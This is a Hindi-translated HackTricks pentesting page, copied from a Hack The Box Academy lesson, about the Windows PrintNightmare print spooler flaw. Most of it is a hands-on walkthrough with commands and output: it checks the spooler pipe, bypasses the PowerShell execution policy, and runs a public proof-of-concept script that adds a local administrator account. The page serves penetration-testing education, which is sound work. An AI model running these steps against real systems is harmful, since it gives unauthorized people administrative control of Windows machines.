# PrintNightmare

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS की नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की आवश्यकता है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
* [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में **शामिल हों** या मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)** का पालन करें**.
* **अपने हैकिंग ट्रिक्स को [hacktricks रेपो](https://github.com/carlospolop/hacktricks) और [hacktricks-cloud रेपो](https://github.com/carlospolop/hacktricks-cloud) में PR जमा करके साझा करें**।

</details>

**यह पृष्ठ** [**https://academy.hackthebox.com/module/67/section/627**](https://academy.hackthebox.com/module/67/section/627) **से कॉपी किया गया था**।

`CVE-2021-1675/CVE-2021-34527 PrintNightmare` एक दोष है [RpcAddPrinterDriver](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-rprn/f23a7519-1c77-4069-9ace-a6d8eae47c22) जिसका उपयोग दूरस्थ प्रिंटिंग और ड्राइवर स्थापना की अनुमति देने के लिए किया जाता है। \
इस कार्य का उद्देश्य है **Windows विशेषाधिकार `SeLoadDriverPrivilege` वाले उपयोगकर्ताओं** को एक दूरस्थ प्रिंट स्पूलर पर ड्राइवर जोड़ने की क्षमता प्रदान करना। यह अधिकांश उपयोगकर्ताओं के लिए आरंभिक निर्मित व्यवस्थापक समूह और प्रिंट ऑपरेटर्स में सुरक्षित रखा जाता है जो एक उपयोगकर्ता के मशीन पर दूरस्थ रूप से प्रिंटर ड्राइवर स्थापित करने की वास्तविक आवश्यकता हो सकती है।

इस दोष ने **किसी भी प्रमाणित उपयोगकर्ता को प्रिंट ड्राइवर जोड़ने** की अनुमति दी बिना उपरोक्त विशेषाधिकार को होने की अनुमति दी, जिससे किसी भी प्रभावित सिस्टम पर हमलावर दूरस्थ **कोड निष्पादन के रूप में पूर्ण दूरस्थ** प्राधिकरण हो सकता है। यह दोष **Windows के हर समर्थित संस्करण को प्रभावित करता है**, और क्योंकि **प्रिंट स्पूलर** डिफ़ॉल्ट रूप से **डोमेन नियंत्रकों**, Windows 7 और 10 पर चलता है, और अक्सर Windows सर्वरों पर सक्षम किया जाता है, इसलिए यह एक विशाल हमला सतह प्रस्तुत करता है, इसलिए "नाइटमेयर"।

माइक्रोसॉफ्ट ने पहले एक पैच जारी किया था जो समस्या को ठीक नहीं करता था (और प्राथमिक मार्गनिर्देशन स्पूलर सेवा को अक्षम करने का था, जो कई संगठनों के लिए व्यावहारिक नहीं है) लेकिन जुलाई 2021 में एक दूसरा [पैच](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) जारी किया गया और मार्गनिर्देशन दिया गया कि निश्चित रजिस्ट्री सेटिंग्स `0` पर सेट हैं या परिभाषित नहीं हैं।&#x20;

इस दुर्भाग्यपूर्णता को सार्वजनिक बनाए जाने के बाद, PoC उत्पन्न तत्व बहुत जल्द जारी किए गए। **** [**यह**](https://github.com/cube0x0/CVE-2021-1675) **संस्करण** [@cube0x0](https://twitter.com/cube0x0) द्वारा उपयोग किया जा सकता है **एक दुष्ट DLL को दूरस्थ या स्थानीय रूप से निष्पादित** करने के लिए Impacket के संशोधित संस्करण का उपयोग करता है। रेपो में एक **C# अमलीकरण** भी है।\
यह **** [**PowerShell अमलीकरण**](https://github.com/calebstewart/CVE-2021-1675) **** त्वरित स्थानीय प्रिविलेज उन्नयन के लिए उपयोग किया जा सकता है। **डिफ़ॉल्ट** रूप से, इस स्क्रिप्ट में **एक नया स्थानीय व्यवस्थापक उपयोगकर्ता जोड़ा जाता है**, लेकिन यदि स्थानीय व्यवस्थापक उपयोगकर्ता स्कोप में नहीं है, तो हम एक कस्टम DLL प्रदान कर सकते हैं जिससे हमें एक रिवर्स शेल या समान प्राप्त हो सकता है।

### **स्पूलर सेवा की जांच करना**

हम निम्नलिखित कमांड के साथ त्वरित जांच क
```
PS C:\htb> ls \\localhost\pipe\spoolss


Directory: \\localhost\pipe


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
spoolss
```
### **PrintNightmare PowerShell PoC के साथ स्थानीय व्यवस्थापक जोड़ना**

पहले लक्ष्य होस्ट पर [बाईपास](https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/) करें निष्पादन नीति:
```
PS C:\htb> Set-ExecutionPolicy Bypass -Scope Process

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help topic at
https:/go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): A
```
अब हम PowerShell स्क्रिप्ट को आयात कर सकते हैं और इसका उपयोग करके एक नया स्थानीय व्यवस्थापक उपयोगकर्ता जोड़ सकते हैं।
```powershell
PS C:\htb> Import-Module .\CVE-2021-1675.ps1
PS C:\htb> Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"

[+] created payload at C:\Users\htb-student\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_am
d64_ce3301b66255a0fb\Amd64\mxdwdrv.dll"
[+] added user hacker as local administrator
[+] deleting payload from C:\Users\htb-student\AppData\Local\Temp\nightmare.dll
```
### **नए व्यवस्थापक उपयोगकर्ता की पुष्टि करना**

यदि सब कुछ योजना के अनुसार हुआ हो, तो हमारे अधीन एक नया स्थानीय व्यवस्थापक उपयोगकर्ता होगा। एक उपयोगकर्ता जोड़ना "शोरगुल" होता है, हमें ऐसा करना नहीं चाहिए जब एक ऐसे अवसर में जहां छिपकर रहना महत्वपूर्ण हो। इसके अलावा, हमें अपने ग्राहक के साथ सत्यापित करना चाहिए कि मापन के लिए खाता निर्माण समावेश में है।
```
PS C:\htb> net user hacker

User name                    hacker
Full Name                    hacker
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            ?8/?9/?2021 12:12:01 PM
Password expires             Never
Password changeable          ?8/?9/?2021 12:12:01 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators
Global Group memberships     *None
The command completed successfully.
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करना चाहिए? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFT संग्रह**](https://opensea.io/collection/the-peass-family)
* [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में या मुझे **Twitter** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **अपने हैकिंग ट्रिक्स को [hacktricks रेपो](https://github.com/carlospolop/hacktricks) और [hacktricks-cloud रेपो](https://github.com/carlospolop/hacktricks-cloud)** को PR जमा करके साझा करें।

</details>
